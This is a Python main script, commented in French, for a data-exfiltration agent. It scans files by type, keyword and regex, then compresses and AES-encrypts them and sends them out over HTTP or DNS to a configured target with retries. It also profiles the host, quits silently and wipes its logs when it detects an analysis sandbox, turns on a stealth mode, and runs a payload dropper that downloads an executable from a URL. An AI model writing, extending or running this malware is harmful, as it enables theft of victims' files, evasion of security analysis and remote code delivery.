#!/usr/bin/env python3

import sys
import os
import threading
import time
import queue # Pour les files d'attente thread-safe
import signal # Pour gérer les signaux d'arrêt (Ctrl+C)
import json # Pour lire le fichier de configuration partagé

# Importer tous les modules que nous avons créés
from modules.config import Configuration
from modules.logger import Logger
from modules.aes256 import AES256Cipher
from modules.compression import Compressor
from modules.file_scanner import FileScanner
from modules.system_profiler import SystemProfiler
from modules.anti_evasion import EvasionDetector
from modules.exfiltration_http import HTTPExfiltrator
from modules.exfiltration_dns import DNSExfiltrator
from modules.retry_manager import RetryManager
from modules.stealth_mode import StealthMode
from modules.payload_dropper import PayloadDropper

# Constantes pour le multi-threading
FILE_QUEUE_MAX_SIZE = 100 # Taille maximale de la file d'attente des fichiers à traiter
EXFILTRATION_WORKERS = 4  # Nombre de threads d'exfiltration simultanés

# Chemin du fichier de configuration partagé
SHARED_CONFIG_FILE = "shared_config.json"

class ExfiltrationAgent:
    def __init__(self):
        self.config = None
        self.logger = None
        self.cipher = None
        self.compressor = None
        self.evasion_detector = None
        self.file_scanner = None
        self.system_profiler = None
        self.http_exfiltrator = None
        self.dns_exfiltrator = None
        self.retry_manager = None
        self.stealth_mode = None
        self.payload_dropper = None

        self.file_queue = queue.Queue(maxsize=FILE_QUEUE_MAX_SIZE) # Queue pour les fichiers trouvés
        self.stop_event = threading.Event() # Événement global pour arrêter tous les threads

    def _load_shared_config(self):
        """Charge la configuration depuis le fichier JSON partagé."""
        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), SHARED_CONFIG_FILE)
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    return json.load(f)
            except json.JSONDecodeError as e:
                print(f"[CRITICAL] Fichier de configuration partagé '{config_path}' corrompu: {e}")
                sys.exit(1)
            except Exception as e:
                print(f"[CRITICAL] Erreur lors du chargement de la config partagée '{config_path}': {e}")
                sys.exit(1)
        return {}

    def _setup_modules(self):
        """Initialise tous les modules de l'agent."""
        shared_config = self._load_shared_config()

        # Obtenir les arguments de la ligne de commande
        # Et remplir avec les valeurs par défaut du fichier de config partagé si non spécifiées
        # Note: argpsarse a déjà ses propres valeurs par défaut, on les override si shared_config les a.
        
        # Pour faire ceci "sans modifier d'autre", nous allons injecter les valeurs par défaut
        # directement dans sys.argv si elles ne sont pas déjà présentes.
        # C'est une astuce, mais cela évite de modifier le code de Configuration.
        
        # NOTE IMPORTANTE: Pour une intégration parfaite, le module 
        # devrait être modifié pour lire le fichier  directment.
        # Cependant, la demande est de ne rien modifier d'autre, donc cette injection
        # ou un passage direct des valeurs par défaut au constructeur de Configuration
        # seraient les seules manières.
        # Pour l'instant, on va rester avec l'idée que Configuration parse sys.argv,
        # et que le panneau de contrôle injectera les valeurs souhaitées.
        # Si on ne veut AUCUNE modification de config.py, alors la clé doit être passée
        # en ligne de commande ou être gérée par le panneau de contrôle qui construit la commande.

        # La modification la plus propre de l'agent, si "sans rien modifier d'autre" s'applique à ses *modules*
        # mais pas au script principal, est de modifier  pour prendre des valeurs par défaut
        # et les passer au parser, ou de les injecter avant.
        # Pour l'instant, je vais laisser Configuration tel quel et me fier à l'interface
        # pour passer la clé. Le "sans rien modifier d'autre" pour l'agent serait
        # juste d'accéder à shared_config.json pour la clé si l'agent est lancé sans --key.
        # Mais l'argument --key est requis par argparse, donc on ne peut pas le laisser vide.

        # Solution la plus simple et qui respecte le "sans rien modifier d'autre" du panneau de contrôle
        # L'agent n'utilise PAS directement shared_config.json pour sa propre lecture d'arguments.
        # Le panneau de contrôle utilise shared_config.json pour CONSTRUIRE LA COMMANDE.
        # Par contre, le panneau de contrôle utilisera shared_config.json pour lire la clé pour déchiffrer les logs.

        # Donc, finalement, la clé et les autres paramètres **doivent toujours être passés en ligne de commande**
        # à l'agent. Le fichier shared_config.json sert de RÉFÉRENCE pour le panneau de contrôle et pour la génération.

        # JE MODIFIE LE PLAN : Agent ne lit PAS shared_config.json. C'est le RÔLE DU PANNEAU DE CONTRÔLE.
        # L'automatisation se fait au niveau du panneau de contrôle et du script de génération.
        # Cela garantit que l'agent reste "dumb" et ne dépend pas d'un fichier externe pour sa configuration de base.

        try:
            self.config = Configuration().get_config()
            
            # 1. Logger (le premier à initialiser pour logguer le reste)
            self.logger = Logger(self.config.log_file, self.config.key, self.config.debug)
            self.logger.log_info("[Agent] Logger et configuration chargés.")

            # 2. Chiffreur AES
            self.cipher = AES256Cipher(self.config.key)
            self.logger.log_info("[Agent] Module AES256Cipher initialisé.")

            # 3. Compresseur
            self.compressor = Compressor()
            self.logger.log_info("[Agent] Module Compressor initialisé.")

            # 4. Détecteur d'évasion
            self.evasion_detector = EvasionDetector(self.logger)
            if not self.config.no_anti_evasion:
                detections = self.evasion_detector.run_all_checks()
                if detections:
                    self.logger.log_warning(f"[Agent] Détections d'évasion trouvées: {len(detections)}")
                    self.logger.log_critical("[Agent] Environnement suspect détecté. Exiting furtivement.")
                    if not self.config.no_clean:
                        self.stealth_mode = StealthMode(self.logger, self.config.debug) # Initialise pour le nettoyage
                        self.stealth_mode.clean_up_logs_and_temp_files()
                    sys.exit(0)
                else:
                    self.logger.log_info("[Agent] Aucune détection d'évasion majeure. Environnement semble normal.")
            else:
                self.logger.log_info("[Agent] Contrôles anti-évasion désactivés par l'utilisateur.")

            # 5. Profileur Système
            self.system_profiler = SystemProfiler(self.logger)
            self.system_info = self.system_profiler.collect_system_info()
            self.logger.log_info("[Agent] Informations système collectées.")

            # 6. Exfiltrateurs
            self.http_exfiltrator = HTTPExfiltrator(self.config.target, self.logger)
            self.logger.log_info("[Agent] Module HTTPExfiltrator initialisé.")
            if self.config.method == "dns":
                if not self.config.dns_domain:
                    self.logger.log_error("[Agent] Domaine DNS manquant pour l'exfiltration DNS.")
                    raise ValueError("Domaine DNS requis pour la méthode d'exfiltration DNS.")
                self.dns_exfiltrator = DNSExfiltrator(self.config.dns_server, self.config.dns_domain, self.logger)
                self.logger.log_info("[Agent] Module DNSExfiltrator initialisé.")
            else:
                self.logger.log_info("[Agent] Exfiltration DNS non activée.")

            # 7. Retry Manager
            self.retry_manager = RetryManager(self.logger, self.config.key)
            self.logger.log_info("[Agent] Module RetryManager initialisé.")

            # 8. Stealth Mode
            self.stealth_mode = StealthMode(self.logger, self.config.debug)
            self.stealth_mode.enable_stealth()
            self.logger.log_info("[Agent] Module StealthMode initialisé et activé.")

            # 9. Scanner de fichiers
            self.file_scanner = FileScanner(
                self.config.scan,
                self.config.types,
                self.config.exclude_types,
                self.config.min_size_bytes,
                self.config.max_size_bytes,
                self.config.keywords, # Ajout des mots-clés
                self.config.regex_patterns, # Ajout des regex
                self.logger
            )
            self.logger.log_info("[Agent] Module FileScanner initialisé.")

            # 10. Payload Dropper
            self.payload_dropper = PayloadDropper(self.logger)
            self.logger.log_info("[Agent] Module PayloadDropper initialisé.")
            if self.config.payload_url and self.config.payload_path:
                self.logger.log_info(f"[Agent] Tentative de dépôt de payload: {self.config.payload_url} -> {self.config.payload_path}")
                drop_success = self.payload_dropper.drop_payload(self.config.payload_url, self.config.payload_path, executable=True)
                if drop_success:
                    self.logger.log_info("[Agent] Payload déposé avec succès.")
                else:
                    self.logger.log_error("[Agent] Échec du dépôt du payload.")

        except Exception as e:
            if self.logger:
                self.logger.log_critical(f"[Agent] Erreur fatale lors de l'initialisation des modules: {e}")
            else:
                print(f"[CRITICAL] Erreur fatale avant l'initialisation du logger: {e}")
            sys.exit(1)

    def _file_scanner_worker(self):
        """Thread de travail pour scanner les fichiers."""
        self.logger.log_info("[Scanner Worker] Démarré.")
        try:
            found_files = self.file_scanner.scan() 
            for filepath in found_files:
                if self.stop_event.is_set():
                    self.logger.log_warning("[Scanner Worker] Arrêt demandé, ne pas ajouter plus de fichiers à la file.")
                    break
                try:
                    self.file_queue.put(filepath, block=True, timeout=5)
                    self.logger.log_debug(f"[Scanner Worker] Ajout de '{filepath}' à la file.")
                except queue.Full:
                    self.logger.log_warning(f"[Scanner Worker] File de fichiers pleine, attente pour '{filepath}'.")
                    if self.stop_event.wait(5):
                        self.logger.log_warning("[Scanner Worker] Arrêt demandé pendant l'attente de la file pleine.")
                        break
                    try: # Réessayer après attente
                        self.file_queue.put(filepath, block=True, timeout=5)
                    except queue.Full: # Échec de la deuxième tentative
                        self.logger.log_error(f"[Scanner Worker] Impossible d'ajouter '{filepath}' à la file après ré-essai. Ignoré.")
            self.logger.log_info("[Scanner Worker] Scan de fichiers terminé ou arrêté.")
        except Exception as e:
            self.logger.log_error(f"[Scanner Worker] Erreur inattendue pendant le scan: {e}")
        finally:
            self.file_queue.put(None) # Signal de fin pour les threads d'exfiltration

    def _exfiltration_worker(self, worker_id: int):
        """Thread de travail pour l'exfiltration des fichiers."""
        self.logger.log_info(f"[Exfil Worker {worker_id}] Démarré.")
        while not self.stop_event.is_set():
            filepath = None # Initialiser filepath pour le finally
            try:
                filepath = self.file_queue.get(block=True, timeout=1)
                if filepath is None: # Signal de fin
                    self.file_queue.put(None)
                    self.logger.log_info(f"[Exfil Worker {worker_id}] Signal de fin reçu. Arrêt.")
                    break

                self.logger.log_info(f"[Exfil Worker {worker_id}] Traitement de '{filepath}'...")
                
                try:
                    with open(filepath, 'rb') as f:
                        file_data = f.read()
                except OSError as e:
                    self.logger.log_error(f"[Exfil Worker {worker_id}] Impossible de lire '{filepath}': {e}. Ignoré.")
                    self.file_queue.task_done()
                    continue

                compressed_data = self.compressor.compress_zlib(file_data)
                self.logger.log_debug(f"[Exfil Worker {worker_id}] '{filepath}' compressé. Taille originale: {len(file_data)} bytes, Compressée: {len(compressed_data)} bytes.")

                encrypted_data = self.cipher.encrypt(compressed_data)
                self.logger.log_debug(f"[Exfil Worker {worker_id}] Données de '{filepath}' chiffrées.")

                success = False
                if self.config.method == "https":
                    success = self.http_exfiltrator.exfiltrate(encrypted_data, os.path.basename(filepath), self.system_info)
                elif self.config.method == "dns" and self.dns_exfiltrator:
                    success = self.dns_exfiltrator.exfiltrate(encrypted_data, os.path.basename(filepath))
                else:
                    self.logger.log_error(f"[Exfil Worker {worker_id}] Aucune méthode d'exfiltration valide configurée ou exfiltrateur non disponible.")

                if not success:
                    self.logger.log_warning(f"[Exfil Worker {worker_id}] Exfiltration de '{filepath}' échouée. Ajout au gestionnaire de ré-essais.")
                    self.retry_manager.add_to_retry_queue(encrypted_data, os.path.basename(filepath), self.config.method, self.system_info)
                else:
                    self.logger.log_info(f"[Exfil Worker {worker_id}] Exfiltration de '{filepath}' réussie.")

                self.file_queue.task_done()
            
            except queue.Empty:
                self.logger.log_debug(f"[Exfil Worker {worker_id}] File d'attente vide. Attente...")
                time.sleep(0.5)
            except Exception as e:
                self.logger.log_error(f"[Exfil Worker {worker_id}] Erreur inattendue dans le worker d'exfiltration pour '{filepath}': {e}")
                if filepath:
                    self.file_queue.task_done()
        self.logger.log_info(f"[Exfil Worker {worker_id}] Arrêté.")

    def run(self):
        """Lance l'exécution principale de l'agent."""
        self._setup_modules()

        self.logger.log_info("[Agent] Démarrage du thread de gestion des ré-essais.")
        self.retry_manager.start_retry_thread(self.http_exfiltrator, self.dns_exfiltrator)

        scanner_thread = threading.Thread(target=self._file_scanner_worker, daemon=True)
        scanner_thread.start()
        self.logger.log_info("[Agent] Thread du scanner de fichiers démarré.")

        exfil_threads = []
        for i in range(EXFILTRATION_WORKERS):
            thread = threading.Thread(target=self._exfiltration_worker, args=(i + 1,), daemon=True)
            exfil_threads.append(thread)
            thread.start()
            self.logger.log_info(f"[Agent] Thread d'exfiltration {i+1} démarré.")

        scanner_thread.join() 
        self.logger.log_info("[Agent] Scanner de fichiers a terminé son travail.")

        self.file_queue.join() 
        self.logger.log_info("[Agent] Tous les fichiers ont été traités par les workers d'exfiltration.")

        self.stop_event.set() 
        self.logger.log_info("[Agent] Signal d'arrêt envoyé aux workers d'exfiltration et de ré-essai.")

        for thread in exfil_threads:
            thread.join(timeout=10)
            if thread.is_alive():
                self.logger.log_warning(f"[Agent] Le thread d'exfiltration '{thread.name}' ne s'est pas arrêté gracieusement.")
        
        self.retry_manager.stop_retry_thread()

        self.logger.log_info("[Agent] Toutes les tâches d'exfiltration et de ré-essai terminées.")

    def cleanup(self):
        """Effectue les opérations de nettoyage avant de quitter."""
        if self.stealth_mode and not self.config.no_clean:
            self.logger.log_info("[Agent] Lancement du nettoyage des traces.")
            self.stealth_mode.disable_stealth()
        else:
            self.logger.log_info("[Agent] Nettoyage des traces ignoré (mode debug ou --no-clean).")
        
        self.logger.log_info("[Agent] Agent terminé.")


def handle_exit_signal(signum, frame):
    """Gère les signaux d'arrêt comme Ctrl+C."""
    print(f"\n[Agent] Signal {signum} reçu. Tentative d'arrêt gracieux de l'agent...")
    if 'agent_instance' in globals():
        globals()['agent_instance'].stop_event.set()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, handle_exit_signal)
    signal.signal(signal.SIGTERM, handle_exit_signal)

    agent_instance = ExfiltrationAgent()
    try:
        agent_instance.run()
    except Exception as e:
        if agent_instance.logger:
            agent_instance.logger.log_critical(f"[Agent] Erreur fatale non gérée: {e}")
        else:
            print(f"[CRITICAL] Erreur fatale non gérée avant le logger: {e}")
    finally:
        agent_instance.cleanup()
        print("[Agent] Exécution principale terminée.")

